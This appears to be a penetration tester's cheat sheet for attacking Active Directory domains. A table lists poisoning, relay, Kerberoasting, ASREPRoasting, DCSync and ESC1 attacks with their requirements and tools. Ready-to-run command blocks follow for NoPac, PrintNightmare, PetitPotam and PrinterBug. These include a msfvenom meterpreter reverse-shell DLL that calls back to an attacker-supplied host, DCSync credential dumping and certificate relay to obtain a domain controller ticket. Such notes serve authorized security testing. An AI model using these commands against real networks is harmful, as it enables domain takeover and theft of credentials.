
| Attack                       | Requirements                                                                                       | Tools                         |
| ---------------------------- | -------------------------------------------------------------------------------------------------- | ----------------------------- |
| ***LLMNR/NBT-NS Poisoning*** | Attacker on same subnet, LLMNR/NBT-NS enabled, victim attempts to connect to non-existent hostname | Responder/Inveigh             |
| ***SMB/NTLM Relay***         | Auth coercion, SMB signing disabled, victim is local admin                                         | Impacket-ntlmrelayx           |
| ***Kerberoasting***          | Domain creds, account has SPN, password is crackable                                               | Rubeus/Impacket-GetUserSPNs   |
| ***ASREPRoasting***          | No kerberos preauth, crackable password                                                            | Rubeus/Impacket-GetNPUsers    |
| ***DCSync***                 | Replicating Directory Changes, Replicating Directory Changes All                                   | Mimikatz/Impacket-secretsdump |
| ***ESC1***                   | Domain creds, active AD CS, published template with "Enroll" rights, template allows client auth   |                               |
### NoPac
```
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -use-ldap

#Shell
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_HOSTNAME> -shell --impersonate <USER> -use-ldap

#DCSync
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_HOSTNAME> --impersonate <USER> -use-ldap -dump -just-dc-user <DOMAIN>/<USER>
```
### PrintNightmare
```
git clone https://github.com/cube0x0/CVE-2021-1675.git
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > backupscript.dll
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

#start msf handler
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<IP> '\\<SERVER_IP>\CompData\backupscript.dll'
```
### PetitPotam
```
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOSTNAME>/certsrv/certfnsh.asp --adcs --template DomainController

#New Window
python3 PetitPotam.py <IP> <DC_IP>

#Catch certificate in ntlmrelay window
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <HASH> <DC_HOSTNAME>.ccache
export KRB5CCNAME=<DC_HOSTNAME>.ccache

#DCSync with TGT
```
### PrinterBug
```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <FQDN>
```